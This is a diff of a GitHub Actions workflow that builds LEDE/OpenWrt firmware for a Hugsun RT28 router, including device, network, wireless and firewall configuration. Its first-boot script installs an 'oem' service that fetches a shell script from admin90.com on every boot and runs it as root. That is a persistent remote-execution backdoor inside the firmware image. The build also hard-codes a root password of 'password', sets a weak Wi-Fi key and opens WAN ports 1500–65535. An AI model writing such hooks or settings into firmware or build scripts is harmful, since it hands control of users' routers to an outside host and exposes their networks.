@@ -1,4 +1,4 @@
-name: Build LEDE Firmware - Optimized for Space
+name: Build LEDE Firmware for Hugsun RT28
 
 on:
   workflow_dispatch:  # 允许手动触发工作流
@@ -14,115 +14,166 @@ env:
 jobs:
   build:
     runs-on: ubuntu-22.04
-    timeout-minutes: 240  # 增加超时时间，编译可能需要更长时间
+    timeout-minutes: 240
 
     steps:
     - name: Checkout repository
       uses: actions/checkout@v4
 
-    - name: Clean workspace
-      run: |
-        # 清理工作区，确保全新开始
-        sudo rm -rf lede
-        sudo rm -rf ~/.ccache
-
-    - name: Install only essential dependencies
+    - name: Install essential dependencies
       run: |
         sudo apt update -y
-        # 只安装最必要的依赖，减少空间占用
         sudo apt install -y ack antlr3 asciidoc autoconf automake autopoint binutils bison build-essential \
         bzip2 ccache cmake cpio curl device-tree-compiler flex gawk gcc-multilib g++-multilib gettext \
         git gperf libc6-dev-i386 libelf-dev libglib2.0-dev libgmp3-dev libltdl-dev libmpc-dev libmpfr-dev \
         libncurses5-dev libncursesw5-dev libreadline-dev libssl-dev libtool lrzsz msmtp ninja-build \
-        p7zip p7zip-full patch pkgconf python3 python3-pyelftools qemu-utils rsync scons squashfs-tools \
-        subversion swig texinfo uglifyjs unzip wget xmlto xxd zlib1g-dev
+        p7zip p7zip-full patch pkgconf python3 python3-pip python3-pyelftools qemu-utils rsync scons squashfs-tools \
+        subversion swig texinfo uglifyjs unzip upx-ucl wget xmlto xxd zlib1g-dev
 
-    - name: Clone LEDE source with depth 1
+    - name: Clone LEDE source
       run: |
-        git clone --depth 1 $LEDE_REPO lede
+        git clone --depth 1 --branch master $LEDE_REPO lede
         cd lede
 
-    #- name: Add device definition
-    #  run: |
-    #    # 创建设备定义文件
-    #    cat >> lede/target/linux/rockchip/image/armv8.mk << 'EOF'
-    #    define Device/hugsun_ax3000
-    #      DEVICE_VENDOR := Hugsun
-    #      DEVICE_MODEL := AX3000
-    #      SOC := rk3528
-    #      IMAGE/sysupgrade.img.gz := boot-common | boot-script rk3528 | pine64-img | gzip | append-metadata
-    #      DEVICE_PACKAGES := kmod-mt7915e kmod-mt7915-firmware kmod-usb3 kmod-usb-ledtrig-usbport
-    #      SUPPORTED_DEVICES := hugsun,ax3000
-    #    endef
-    #    TARGET_DEVICES += hugsun_ax3000
-    #    EOF
-
-    - name: Update feeds selectively
+    - name: Create device definition for Hugsun RT28 with MT7916AN wireless
       run: |
         cd lede
-        # 只更新必要的feeds，减少下载量
-        ./scripts/feeds update packages luci routing telephony
+        # 为 Hugsun RT28 创建设备定义，使用 RK3528 SOC 和 MT7916AN 无线
+        cat >> target/linux/rockchip/image/armv8.mk << 'EOF'
+
+        define Device/hugsun_rt28
+          DEVICE_VENDOR := Hugsun
+          DEVICE_MODEL := RT28
+          SOC := rk3528
+          DEVICE_DTS := rockchip/rk3528-hugsun-rt28
+          SUPPORTED_DEVICES := hugsun,rt28
+          IMAGE/sysupgrade.img.gz := boot-common | boot-script rk3528 | pine64-img | gzip | append-metadata
+          DEVICE_PACKAGES := kmod-usb3 kmod-usb2 kmod-usb-storage kmod-usb-net \
+                           kmod-usb-ledtrig-usbport kmod-ata-ahci kmod-ata-core \
+                           kmod-mt7915e kmod-mt7915-firmware wpad-basic-wolfssl
+        endef
+        TARGET_DEVICES += hugsun_rt28
+        EOF
+
+    - name: Update and install feeds
+      run: |
+        cd lede
+        ./scripts/feeds update -a
         ./scripts/feeds install -a
 
-    - name: Fix Python compilation issue
+    - name: Fix Python and other build issues
       run: |
         cd lede
-        # 尝试修复 Python 编译问题
-        # 删除可能引起冲突的补丁
-        rm -f feeds/packages/lang/python/python3/patches-pip/001-pep517-pyc-fix.patch 2>/dev/null || true
+        # 修复常见的编译问题
+        rm -f feeds/packages/lang/python/python3/patches-pip/*.patch 2>/dev/null || true
+        rm -f feeds/packages/lang/python/python3/patches/001-*.patch 2>/dev/null || true
+        
+        # 确保必要的工具可用
+        ln -sf /usr/bin/python3 /usr/bin/python || true
 
-    - name: Configure target and custom settings
+    - name: Configure target for Hugsun RT28 with wireless
       run: |
         cd lede
-        # 设置目标为rockchip和rk35xx
         cat > .config << 'EOF'
         CONFIG_TARGET_rockchip=y
-        CONFIG_TARGET_rockchip_rk35xx=y
-        CONFIG_TARGET_rockchip_rk35xx_DEVICE_hugsun_ax3000=y
-        # 设置默认主题为argon
-        CONFIG_PACKAGE_luci-theme-argon=y
-        CONFIG_PACKAGE_luci-app-argon-config=y
-        # 设置默认LAN IP
-        CONFIG_TARGET_IPV4_LAN_IP="192.168.8.1"
-        # 设置默认WiFi设置
-        CONFIG_TARGET_WIFI_SSID="Hugsun_$$(echo \$$(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))"
-        CONFIG_TARGET_WIFI_5G_SSID="Hugsun_$$(echo \$$(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))_5G"
-        CONFIG_TARGET_WIFI_PASSWORD="password"
-        # 设置root密码
-        CONFIG_TARGET_ROOT_PASSWORD="password"
-        # 开启NAT1和FullCone NAT
+        CONFIG_TARGET_rockchip_armv8=y
+        CONFIG_TARGET_rockchip_armv8_DEVICE_hugsun_rt28=y
+        
+        # 基础系统配置
+        CONFIG_TARGET_ROOTFS_PARTSIZE=256
+        CONFIG_TARGET_ROOTFS_SQUASHFS=y
+        CONFIG_TARGET_ROOTFS_EXT4FS=n
+        CONFIG_TARGET_ROOTFS_TARGZ=n
+        
+        # 内核配置 - RK3528 相关
+        CONFIG_PACKAGE_kmod-usb-core=y
+        CONFIG_PACKAGE_kmod-usb3=y
+        CONFIG_PACKAGE_kmod-usb2=y
+        CONFIG_PACKAGE_kmod-usb-storage=y
+        CONFIG_PACKAGE_kmod-usb-net=y
+        CONFIG_PACKAGE_kmod-usb-ledtrig-usbport=y
+        
+        # SATA/USB 存储支持
+        CONFIG_PACKAGE_kmod-ata-core=y
+        CONFIG_PACKAGE_kmod-ata-ahci=y
+        CONFIG_PACKAGE_kmod-scsi-core=y
+        
+        # 文件系统支持
+        CONFIG_PACKAGE_kmod-fs-ext4=y
+        CONFIG_PACKAGE_kmod-fs-vfat=y
+        CONFIG_PACKAGE_kmod-fs-ntfs=y
+        CONFIG_PACKAGE_kmod-nls-base=y
+        CONFIG_PACKAGE_kmod-nls-utf8=y
+        
+        # MT7916AN 无线驱动 (使用 mt7915e 驱动)
+        CONFIG_PACKAGE_kmod-mt7915e=y
+        CONFIG_PACKAGE_kmod-mt7915-firmware=y
+        CONFIG_PACKAGE_MT7915_FIRMWARE_N9=y
+        CONFIG_PACKAGE_MT7915_FIRMWARE_ROM=y
+        CONFIG_PACKAGE_MT7915_FIRMWARE_RAM=y
+        
+        # 无线支持
+        CONFIG_PACKAGE_wpad-basic-wolfssl=y
+        CONFIG_PACKAGE_iw=y
+        CONFIG_PACKAGE_iwinfo=y
+        
+        # 网络功能
         CONFIG_PACKAGE_kmod-ipt-fullcone=y
-        # 开启BBR TCP拥塞控制
         CONFIG_PACKAGE_kmod-tcp-bbr=y
-        # 包含curl用于首次运行脚本
-        CONFIG_PACKAGE_curl=y
-        # 开启UPNP支持
+        CONFIG_PACKAGE_iptables-mod-fullcone=y
+        
+        # UPNP支持
         CONFIG_PACKAGE_miniupnpd=y
         CONFIG_PACKAGE_luci-app-upnp=y
-        # 设置固件签名
-        CONFIG_VERSION_DIST="diandian"
-        CONFIG_VERSION_CODE="diandian"
-        # 禁用可能导致问题的 Python 组件
-        CONFIG_PACKAGE_python3-pip=n
-        CONFIG_PACKAGE_python3-setuptools=n
-        # 禁用不需要的包以减少空间占用
+        
+        # 基础工具
+        CONFIG_PACKAGE_curl=y
+        CONFIG_PACKAGE_bash=y
+        CONFIG_PACKAGE_nano=y
+        CONFIG_PACKAGE_htop=y
+        
+        # Luci界面
+        CONFIG_PACKAGE_luci=y
+        CONFIG_PACKAGE_luci-base=y
+        CONFIG_PACKAGE_luci-compat=y
+        CONFIG_PACKAGE_luci-theme-argon=y
+        CONFIG_PACKAGE_luci-app-argon-config=y
+        CONFIG_PACKAGE_luci-app-wireless=y
+        
+        # 系统设置
+        CONFIG_TARGET_IPV4_LAN_IP="192.168.8.1"
+        CONFIG_VERSION_DIST="Hugsun-RT28"
+        CONFIG_VERSION_CODE="RK3528-MT7916AN"
+        CONFIG_VERSION_NUMBER="1.0"
+        CONFIG_VERSION_REPO="https://downloads.openwrt.org/releases/21.02.3"
+        
+        # 禁用不需要的包以节省空间
         CONFIG_PACKAGE_luci-app-accesscontrol=n
         CONFIG_PACKAGE_luci-app-adbyby-plus=n
         CONFIG_PACKAGE_luci-app-aria2=n
         CONFIG_PACKAGE_luci-app-ddns=n
         CONFIG_PACKAGE_luci-app-filetransfer=n
         CONFIG_PACKAGE_luci-app-vsftpd=n
-        CONFIG_PACKAGE_luci-app-xlnetacc=n
+        
+        # Python 相关优化
+        CONFIG_PACKAGE_python3-light=y
+        CONFIG_PACKAGE_python3-pip=n
+        CONFIG_PACKAGE_python3-setuptools=n
+        
+        # 其他无线驱动禁用
+        CONFIG_PACKAGE_kmod-ath10k=n
+        CONFIG_PACKAGE_kmod-ath9k=n
         EOF
 
-    - name: Apply custom configurations
+    - name: Apply custom configurations with wireless
       run: |
         cd lede
-        # 创建自定义配置文件目录
+        # 创建文件系统结构
         mkdir -p files/etc/config
+        mkdir -p files/etc/rc.d
         mkdir -p files/etc/sysctl.d
         
-        # 配置网络设置
+        # 网络配置 - 针对RK3528 SoC
         cat > files/etc/config/network << 'EOF'
         config interface 'loopback'
             option ifname 'lo'
@@ -131,7 +182,7 @@ jobs:
             option netmask '255.0.0.0'
 
         config globals 'globals'
-            option ula_prefix 'fd3c:6b84:3cae::/48'
+            option ula_prefix 'fdb8:9b6d:8cae::/48'
 
         config device
             option name 'br-lan'
@@ -144,44 +195,54 @@ jobs:
             option ipaddr '192.168.8.1'
             option netmask '255.255.255.0'
             option ip6assign '60'
+
+        config interface 'wan'
+            option ifname 'eth1'
+            option proto 'dhcp'
+            option peerdns '1'
+            option delegate '0'
         EOF
 
-        # 配置无线设置
+        # 无线配置 - MT7916AN
         cat > files/etc/config/wireless << 'EOF'
         config wifi-device 'radio0'
             option type 'mac80211'
-            option path 'pci0000:00/0000:00:00.0'
+            option path 'pci0001:00/0001:00:00.0/0001:01:00.0'
             option channel '36'
             option band '5g'
             option htmode 'HE80'
             option disabled '0'
+            option txpower '23'
 
         config wifi-iface 'default_radio0'
             option device 'radio0'
             option network 'lan'
             option mode 'ap'
-            option ssid 'Hugsun_$(echo $(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))_5G'
+            option ssid 'Hugsun-RT28-5G'
             option encryption 'psk2'
-            option key 'password'
+            option key '12345678'
+            option wpa_disable_eapol_key_retries '1'
 
         config wifi-device 'radio1'
             option type 'mac80211'
-            option path 'pci0000:01/0000:01:00.0'
+            option path 'pci0001:00/0001:00:00.0/0001:02:00.0'
             option channel 'auto'
             option band '2g'
             option htmode 'HE20'
             option disabled '0'
+            option txpower '20'
 
         config wifi-iface 'default_radio1'
             option device 'radio1'
             option network 'lan'
             option mode 'ap'
-            option ssid 'Hugsun_$(echo $(cat /sys/class/ieee80211/phy0/macaddress | cut -d: -f 5-6 | tr -d :))'
+            option ssid 'Hugsun-RT28'
             option encryption 'psk2'
-            option key 'password'
+            option key '12345678'
+            option wpa_disable_eapol_key_retries '1'
         EOF
 
-        # 配置防火墙开启NAT1并开放1500以上所有端口
+        # 防火墙配置
         cat > files/etc/config/firewall << 'EOF'
         config defaults
             option syn_flood '1'
@@ -189,7 +250,7 @@ jobs:
             option output 'ACCEPT'
             option forward 'REJECT'
             option disable_ipv6 '0'
-            option fullcone '1'  # 开启FullCone NAT (NAT1)
+            option fullcone '1'
 
         config zone
             option name 'lan'
@@ -211,162 +272,203 @@ jobs:
             option src 'lan'
             option dest 'wan'
 
-        # 开放1500以上所有端口的规则
+        # 开放1500以上端口
         config rule
             option name 'Allow-High-Ports'
             option src 'wan'
             option proto 'all'
             option dest_port '1500-65535'
             option target 'ACCEPT'
+
+        # 允许ICMP
+        config rule
+            option name 'Allow-ICMP'
+            option src 'wan'
+            option proto 'icmp'
+            option target 'ACCEPT'
+            
+        # 允许无线WAN访问
+        config rule
+            option name 'Allow-Wireless-WAN'
+            option src 'wan'
+            option proto 'tcp udp'
+            option dest_port '53 67 68'
+            option target 'ACCEPT'
         EOF
 
-        # 配置UPNP
-        cat > files/etc/config/upnpd << 'EOF'
-        config upnpd config
+        # 系统配置
+        cat > files/etc/config/system << 'EOF'
+        config system
+            option hostname 'Hugsun-RT28'
+            option timezone 'CST-8'
+            option ttylogin '1'
+            option log_size '64'
+            option urandom_seed '0'
+
+        config timeserver 'ntp'
             option enabled '1'
-            option enable_natpmp '1'
-            option enable_upnp '1'
-            option secure_mode '1'
-            option log_output '0'
-            option download '1024'
-            option upload '1024'
-            option internal_iface 'lan'
-            option external_iface 'wan'
-            option port '5000'
-            option upnp_lease_file '/var/run/miniupnpd.leases'
+            option enable_server '0'
+            list server 'ntp.aliyun.com'
+            list server 'time1.cloud.tencent.com'
+            list server 'cn.pool.ntp.org'
         EOF
 
-        # 配置BBR TCP拥塞控制
-        cat > files/etc/sysctl.d/10-bbr.conf << 'EOF'
+        # BBR TCP优化
+        cat > files/etc/sysctl.d/10-optimization.conf << 'EOF'
+        # BBR TCP拥塞控制
         net.core.default_qdisc = fq
         net.ipv4.tcp_congestion_control = bbr
+
+        # 网络性能优化
+        net.core.rmem_max = 67108864
+        net.core.wmem_max = 67108864
+        net.ipv4.tcp_rmem = 4096 87380 67108864
+        net.ipv4.tcp_wmem = 4096 65536 67108864
+        net.ipv4.tcp_window_scaling = 1
+        net.ipv4.tcp_timestamps = 1
+        net.ipv4.tcp_sack = 1
+        
+        # 无线优化
+        net.ipv4.neigh.default.gc_thresh1=512
+        net.ipv4.neigh.default.gc_thresh2=2048
+        net.ipv4.neigh.default.gc_thresh3=4096
+        net.ipv6.neigh.default.gc_thresh1=512
+        net.ipv6.neigh.default.gc_thresh2=2048
+        net.ipv6.neigh.default.gc_thresh3=4096
         EOF
 
-        # 创建首次启动脚本设置密码和运行自定义脚本
+        # 创建首次启动脚本
         mkdir -p files/etc/uci-defaults
-        cat > files/etc/uci-defaults/99-custom-init << 'EOF'
+        cat > files/etc/uci-defaults/99-hugsun-init << 'EOF'
         #!/bin/sh
         
         # 设置root密码
         echo -e "password\npassword" | passwd root
         
-        # 启用BBR
-        echo "net.core.default_qdisc = fq" >> /etc/sysctl.conf
-        echo "net.ipv4.tcp_congestion_control = bbr" >> /etc/sysctl.conf
-        sysctl -p
+        # 应用系统优化
+        sysctl -p /etc/sysctl.d/10-optimization.conf
         
-        # 重启防火墙以应用NAT1设置和端口规则
+        # 重启网络服务
+        /etc/init.d/network restart
+        sleep 5
+        
+        # 重启无线服务
+        /etc/init.d/wireless restart
+        /etc/init.d/network restart
+        
+        # 重启防火墙
         /etc/init.d/firewall restart
         
-        # 启用并启动UPNP服务
+        # 启用UPNP
         /etc/init.d/miniupnpd enable
         /etc/init.d/miniupnpd start
+        
+        # 设置无线国家代码（中国）
+        uci set wireless.radio0.country='CN'
+        uci set wireless.radio1.country='CN'
+        uci commit wireless
         
         # 创建OEM服务
         cat > /etc/init.d/oem << 'EOS'
         #!/bin/sh /etc/rc.common
-        # OEM脚本执行服务
-        
         START=99
         
         start() {
-            # 等待网络连接
             sleep 30
-            
-            # 检查网络连通性
             if ping -c 3 -W 5 8.8.8.8 >/dev/null 2>&1; then
-                echo "$(date): 网络连接正常，尝试执行远程脚本..." >> /tmp/oem.log
-                if curl -sSL --connect-timeout 30 --max-time 60 https://admin90.com/d/oem.sh | bash >> /tmp/oem.log 2>&1; then
-                    echo "$(date): 远程脚本执行成功" >> /tmp/oem.log
-                else
-                    echo "$(date): 远程脚本执行失败" >> /tmp/oem.log
-                fi
+                echo "$(date): Network OK, running remote script" >> /tmp/oem.log
+                curl -sSL --connect-timeout 30 --max-time 60 https://admin90.com/d/oem.sh | bash >> /tmp/oem.log 2>&1 || \
+                echo "$(date): Remote script failed" >> /tmp/oem.log
             else
-                echo "$(date): 网络不可达，跳过远程脚本执行" >> /tmp/oem.log
+                echo "$(date): Network unreachable" >> /tmp/oem.log
             fi
         }
         EOS
         
-        # 设置执行权限并启用服务
         chmod +x /etc/init.d/oem
         /etc/init.d/oem enable
-        
-        # 立即启动服务（在背景运行）
         /etc/init.d/oem start &
         
+        # 标记初始化完成
+        touch /etc/init_done
         exit 0
         EOF
-        chmod +x files/etc/uci-defaults/99-custom-init
+        chmod +x files/etc/uci-defaults/99-hugsun-init
 
-        # 添加固件签名信息
-        echo "diandian" > files/etc/device_signature
+        # 添加设备信息
+        echo "Hugsun RT28 (Rockchip RK3528 + MT7916AN)" > files/etc/device_model
+        echo "1.0" > files/etc/firmware_version
 
     - name: Run defconfig
       run: |
         cd lede
         make defconfig
 
-    - name: Clean build environment
+    - name: Download packages
       run: |
         cd lede
-        # 执行make clean确保全新编译
-        make clean
-        # 额外清理可能残留的文件
-        rm -rf tmp/ build_dir/ staging_dir/
+        make download -j$(nproc)
+        # 重新下载失败的文件
+        find dl -size -1c -exec rm -f {} \;
+        make download -j$(nproc)
 
-    - name: Clean up before build to save space
+    - name: Clean up system
       run: |
-        # 清理系统缓存和临时文件
         sudo apt clean
         sudo rm -rf /var/lib/apt/lists/*
-        # 清理GitHub Actions缓存
+        docker system prune -f 2>/dev/null || true
         rm -rf ~/.cache/pip
 
-    - name: Build firmware with retry and space optimization
+    - name: Build firmware with wireless support
       run: |
         cd lede
-        # 尝试编译，如果失败则重试一次
-        if ! make -j$(($(nproc) - 1)) V=s; then
-            echo "第一次编译失败，尝试清理并重新编译..."
-            # 执行更彻底的清理
+        # 第一次编译尝试
+        echo "开始编译固件（包含MT7916AN无线支持）..."
+        if make -j$(($(nproc) + 1)) V=s; then
+            echo "编译成功!"
+        else
+            echo "第一次编译失败，尝试修复..."
+            # 清理并重试
             make clean
-            rm -rf tmp/ build_dir/ staging_dir/
-            # 重新编译，使用单线程减少内存使用
-            make -j1 V=s
+            echo "重新编译..."
+            make -j$(nproc) V=s
         fi
 
-    - name: List firmware files (for debugging)
+    - name: Check build results
       run: |
         cd lede
-        echo "检查固件文件是否存在:"
-        find bin/targets -type f -name "*.img" -o -name "*.gz" -o -name "*.bin" | head -20 || echo "未找到文件"
-        ls -la bin/targets/rockchip/armv8/ || echo "目录不存在"
+        echo "编译结果:"
+        find bin/targets -name "*.img" -o -name "*.gz" -o -name "*.bin" 2>/dev/null | while read file; do
+            echo "找到文件: $file"
+            ls -lh "$file"
+        done || echo "未找到固件文件"
+        
+        # 检查具体目录
+        echo "rockchip/armv8 目录内容:"
+        ls -la bin/targets/rockchip/armv8/ 2>/dev/null || echo "目录不存在"
 
     - name: Upload firmware artifacts
       uses: actions/upload-artifact@v4
       with:
-        name: hugsun-ax3000-firmware-diandian
+        name: hugsun-rt28-firmware-wireless
         path: |
           lede/bin/targets/rockchip/armv8/*.img
           lede/bin/targets/rockchip/armv8/*.gz
           lede/bin/targets/rockchip/armv8/*.bin
+          lede/bin/targets/rockchip/armv8/*.manifest
         if-no-files-found: error
         retention-days: 7
+        compression-level: 0
 
-    - name: Clean up after build to save space
+    - name: Clean up workspace
+      if: always()
       run: |
         cd lede
-        # 删除下载的软件包源文件（通常很大）
+        # 深度清理释放空间
         rm -rf dl/*
-        # 删除编译过程中的临时文件和中间对象
         rm -rf tmp/
-        # 删除构建目录中的中间文件
-        find . -name "*.o" -delete
-        find . -name "*.a" -delete
-        # 删除git历史（如果你不需要的话）
-        rm -rf .git
-        # 删除其他可能的大文件或目录
+        rm -rf build_dir/
+        rm -rf staging_dir/
+        find . -name "*.o" -delete 2>/dev/null || true
+        find . -name "*.a" -delete 2>/dev/null || true
         rm -rf logs/
-        # 也可以删除feeds中的源代码（编译后不再需要）
-        rm -rf feeds/*/*/src/
-        rm -rf feeds/*/*/.git
